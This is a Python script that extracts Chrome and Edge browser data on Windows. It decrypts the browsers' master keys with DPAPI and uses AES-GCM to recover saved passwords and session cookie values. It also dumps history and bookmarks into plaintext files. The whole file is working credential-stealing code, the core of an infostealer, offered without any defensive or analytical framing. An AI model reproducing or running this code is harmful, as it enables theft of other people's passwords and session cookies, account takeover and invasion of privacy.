import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt  # Install with: pip install pypiwin32
from Crypto.Cipher import AES  # Install with: pip install pycryptodome

## CHROME FUNCTIONS ##
def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

def get_chrome_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="UTF-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""

#Cookies
def extract_chrome_cookies(output_file):
    try:
        # Path to the local Chrome cookies database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData",
                               "Local", "Google", "Chrome", "User Data", "Default",
                               "Network", "Cookies")

        # Connect to the database
        db = sqlite3.connect(db_path)
        # Ignore decoding errors
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()

        # Retrieve cookies from the `Cookies` table
        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc,
        expires_utc, encrypted_value
        FROM Cookies""")

        # Get the AES key
        key = get_chrome_encryption_key()
        with open(output_file, "w", encoding="utf-8") as cookies_file:
            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                if not value:
                    decrypted_value = decrypt_data(encrypted_value, key)
                else:
                    # Already decrypted
                    decrypted_value = value
                cookies_file.write(f"Host : {host_key}\n")
                cookies_file.write(f"Cookie Name : {name}\n")
                cookies_file.write(f"Cookie Value(decrypted) : {decrypted_value}\n")
                cookies_file.write(f"Creation Datetime(UTC): {get_chrome_datetime(creation_utc)}\n")
                cookies_file.write(f"Last Access Datetime(UTC) : {get_chrome_datetime(last_access_utc)}\n")
                cookies_file.write(f"Expires Datetime (UTC) : {get_chrome_datetime(expires_utc)}\n")
                cookies_file.write("========================================================================================\n")

    except PermissionError as e:
        print(f"PermissionError: {e}")
    finally:
        # Close the connection
        db.close()

#History
def extract_chrome_history(output_file):
    try:
        # Path to the local Chrome history database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData",
                               "Local", "Google", "Chrome", "User Data", "Default",
                               "History")

        # Connect to the history database
        db = sqlite3.connect(db_path)
        cursor = db.cursor()

        # Retrieve browsing history from the `urls` table
        cursor.execute("""
        SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch') AS last_visited,
        title, url FROM urls""")

        with open(output_file, "w", encoding="utf-8") as history_file:
            for row in cursor.fetchall():
                last_visited, title, url = row
                history_file.write(f"Last Visited : {last_visited}\n")
                history_file.write(f"Title : {title}\n")
                history_file.write(f"URL : {url}\n")
                history_file.write("========================================================================================\n")

    except PermissionError as e:
        print(f"PermissionError: {e}")
    except Exception as e:
        print(f"Error extracting history: {e}")
    finally:
        # Close the connection
        db.close()

#Bookmarks
def extract_chrome_bookmarks(output_file):
    chrome_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
    bookmarks_path = os.path.join(chrome_data_path, 'Bookmarks')

    # Check if the bookmarks file exists
    if not os.path.exists(bookmarks_path):
        print(f"No bookmarks file found at {bookmarks_path}")
        return

    try:
        with open(bookmarks_path, 'r', encoding='utf-8') as file:
            bookmarks_data = json.load(file)

        with open(output_file, 'w', encoding='utf-8') as file:
            def traverse_bookmarks(node):
                if 'type' in node and node['type'] == 'url':
                    file.write(f"{node['name']} | {node['url']}\n")
                elif 'children' in node:
                    for child in node['children']:
                        traverse_bookmarks(child)

            # Traverse root nodes
            for root_node in bookmarks_data['roots']:
                traverse_bookmarks(bookmarks_data['roots'][root_node])

    except Exception as e:
        print(f"Error extracting bookmarks: {str(e)}")

#Passwords
def extract_chrome_passwords(output_file):
    try:
        # Get the AES key
        key = get_chrome_encryption_key()
        # Path to the local Chrome passwords database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        # Copy the file to another location as the database will be locked if Chrome is running
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        # Connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        # Table `logins` contains the required data
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        with open(output_file, "w", encoding="utf-8") as passwords_file:
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_data(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
                if username or password:
                    passwords_file.write(f"URL: {origin_url}\n")
                    passwords_file.write(f"Username: {username}\n")
                    passwords_file.write(f"Password: {password}\n")
                else:
                    continue
                if date_created != 86400000000 and date_created:
                    passwords_file.write(f"Creation Date: {str(get_chrome_datetime(date_created))}\n")
                if date_last_used != 86400000000 and date_last_used:    
                    passwords_file.write("========================================================================================\n")
        cursor.close()
        db.close()
        try:
            # Try to delete the copied database file
            os.remove(filename)
        except:
            pass

    except PermissionError as e:
        print(f"PermissionError: {e}")

## EDGE
# Function to get the Edge browser's datetime from a given 'edgedate'.
def get_edge_datetime(edgedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=edgedate)

#Bookmarks
def extract_edge_bookmarks(output_file):
    edge_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")
    bookmarks_path = os.path.join(edge_data_path, 'Bookmarks')

    if not os.path.exists(bookmarks_path):
        print(f"No bookmarks file found at {bookmarks_path}")
        return

    try:
        with open(bookmarks_path, 'r', encoding='utf-8') as file:
            bookmarks_data = json.load(file)

        with open(output_file, 'w', encoding='utf-8') as file:
            def traverse_bookmarks(node):
                if 'type' in node and node['type'] == 'url':
                    file.write(f"{node['name']} | {node['url']}\n")
                elif 'children' in node:
                    for child in node['children']:
                        traverse_bookmarks(child)

            for root_node in bookmarks_data['roots']:
                traverse_bookmarks(bookmarks_data['roots'][root_node])

    except Exception as e:
        print(f"Error extracting Edge bookmarks: {e}")

#History
def extract_edge_history(output_file):
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Microsoft", "Edge", "User Data", "Default", "History")

        db = sqlite3.connect(db_path)
        cursor = db.cursor()

        cursor.execute("""
        SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch') AS last_visited,
        title, url FROM urls""")

        with open(output_file, "w", encoding="utf-8") as history_file:
            for row in cursor.fetchall():
                last_visited, title, url = row
                history_file.write(f"Last Visited: {last_visited}\n")
                history_file.write(f"Title: {title}\n")
                history_file.write(f"URL: {url}\n")
                history_file.write("========================================================================================\n")

    except PermissionError as e:
        print(f"PermissionError: {e}")
    except Exception as e:
        print(f"Error extracting Edge history: {e}")
    finally:
        db.close()

#Cookies
def extract_edge_cookies(output_file):
    db = None
    try:
        # Original path to the Edge cookies database
        original_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Microsoft", "Edge", "User Data", "Default",
                                        "Network", "Cookies")

        # Ensure the original database file exists
        if not os.path.isfile(original_db_path):
            raise FileNotFoundError(f"Edge cookies database not found at {original_db_path}")

        # Path for the temporary copy of the database
        temp_db_path = os.path.join("C:\\Users\\Nuri\\Downloads", "temp_EdgeCookies.db")

        # Copy the database file to the temporary location
        shutil.copyfile(original_db_path, temp_db_path)

        # Connect to the copied database
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()

        # Retrieve cookies from the `Cookies` table
        cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM Cookies")

        # Get the AES key for Edge
        key = get_edge_encryption_key()

        # Write the cookies to the output file
        with open(output_file, "w", encoding="utf-8") as cookies_file:
            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                decrypted_value = value if value else edge_decrypted_password(encrypted_value, key)
                cookies_file.write(f"Host: {host_key}\n")
                cookies_file.write(f"Cookie Name: {name}\n")
                cookies_file.write(f"Cookie Value (decrypted): {decrypted_value}\n")
                cookies_file.write(f"Creation Datetime (UTC): {get_edge_datetime(creation_utc)}\n")
                cookies_file.write(f"Last Access Datetime (UTC): {get_edge_datetime(last_access_utc)}\n")
                cookies_file.write(f"Expires Datetime (UTC): {get_edge_datetime(expires_utc)}\n")
                cookies_file.write("========================================================================================\n")

    except FileNotFoundError as e:
        print(f"File not found error: {e}")
    except Exception as e:
        print(f"Error extracting Edge cookies: {e}")
    finally:
        # Close the database connection and remove the temporary file
        if db:
            db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            print(f"Error cleaning up temporary files: {e}")


# Define the decrypted_password function for Edge
def get_edge_encryption_key():
    # Construct the path to the "Local State" file in Edge's user data.
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Microsoft", "Edge", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # Decode the encryption key from base64.
    key = base64.b64decode(local_state['os_crypt']["encrypted_key"])
    # Remove DPAPI prefix.
    key = key[5:]
    # Return the decrypted key, originally encrypted using the user's current login credentials.
    # Documentation: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def edge_decrypted_password(password, key):
    try:
        # Get the initialization vector (IV).
        iv = password[3:15]
        password = password[15:]
        # Generate a cipher.
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # Decrypt the password.
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # Not supported.
            return ""

        
# Function to extract Edge passwords
def extract_edge_passwords(output_file):
    try:
        # Get the AES key
        key = get_edge_encryption_key()
        # Path to the local Edge passwords database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Microsoft", "Edge", "User Data", "Default", "Login Data")
        # Copy the file to another location as the database will be locked if Edge is running
        filename = "EdgePasswordsData.db"
        shutil.copyfile(db_path, filename)
        # Connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        # Table `logins` contains the required data
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        with open(output_file, "w", encoding="utf-8") as passwords_file:
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = edge_decrypted_password(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
                if username or password:
                    passwords_file.write(f"URL: {origin_url}\n")
                    passwords_file.write(f"Username: {username}\n")
                    passwords_file.write(f"Password: {password}\n")
                else:
                    continue
                if date_created != 86400000000 and date_created:
                    passwords_file.write(f"Creation Date: {str(get_edge_datetime(date_created))}\n")
                passwords_file.write("========================================================================================\n")
        cursor.close()
        db.close()
        try:
            # Try to delete the copied database file
            os.remove(filename)
        except:
            pass

    except PermissionError as e:
        print(f"PermissionError: {e}") 

def main():
    # Create the "Browsers" directory if it doesn't exist
    browsers_dir = "Browsers"
    if not os.path.exists(browsers_dir):
        os.makedirs(browsers_dir)

    # Specify the full paths for the output files
    chrome_cookies_output_file = os.path.join(browsers_dir, "Chrome_cookies.txt")
    chrome_history_output_file = os.path.join(browsers_dir, "Chrome_history.txt")
    chrome_bookmarks_output_file = os.path.join(browsers_dir, "Chrome_bookmarks.txt")
    chrome_passwords_output_file = os.path.join(browsers_dir, "Chrome_passwords.txt")
    
    edge_passwords_output_file = os.path.join(browsers_dir, "Edge_passwords.txt")
    edge_bookmarks_output_file = os.path.join(browsers_dir, "Edge_bookmarks.txt")
    edge_history_output_file = os.path.join(browsers_dir, "Edge_history.txt")
    edge_cookies_output_file = os.path.join(browsers_dir, "Edge_cookies.txt")

    extract_chrome_cookies(chrome_cookies_output_file)
    extract_chrome_history(chrome_history_output_file)
    extract_chrome_bookmarks(chrome_bookmarks_output_file)
    extract_chrome_passwords(chrome_passwords_output_file)
    
    extract_edge_passwords(edge_passwords_output_file)
    extract_edge_bookmarks(edge_bookmarks_output_file)
    extract_edge_history(edge_history_output_file)
    extract_edge_cookies(edge_cookies_output_file)

if __name__ == "__main__":
    main()
